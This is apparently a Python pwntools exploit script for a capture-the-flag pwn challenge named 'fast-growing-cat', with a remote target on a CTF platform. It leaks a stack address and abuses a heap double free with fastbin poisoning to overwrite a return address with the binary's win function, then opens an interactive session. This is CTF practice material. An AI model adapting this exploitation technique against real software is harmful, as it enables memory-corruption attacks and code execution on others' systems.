#!/usr/bin/python3
from pwn import * 

exe = ELF('./fast-growing-cat_patched', checksec=False)
libc = ELF('./libc-2.31.so', checksec=False)
context.binary  = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		b* 0x000000000040159b
		b* 0x0000000000401344
		c
		''')

if args.REMOTE:
	HOST = 'host8.dreamhack.games'
	PORT = 18510
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

def cook(name, idx):
	sa(b'meow? ', b'miow')
	sla(b'cat food? ', name)
	slan(b'it in? ', idx)
def feed(idx):
	sa(b'meow? ', b'meow')
	slan(b'feed? ', idx)

#GDB()
#input()
sla(b'meow? ', b'A' * 0x20)
ru(b'A' * 0x20)
ret = leak(r(6), 0x20)
info("Stack: ", ret)

for _ in range(7):
	cook(b'A', 0)
	feed(0)

#input("Stack")
cook(b'A', 0)
cook(b'A', 1)
feed(0)
feed(1)
feed(0)
cook(p64(ret), 0)
cook(b'A', 1)
cook(b'A', 1)

pld = b'miow' 
pld = pld.ljust(0x18, b'A') + p64(0x41)
sa(b'meow? ', pld)
sla(b'cat food? ', b'\0' * 8 + p64(exe.sym.win))
slan(b'it in? ', 0)
sa(b'meow? ', b'muow')
p.interactive()

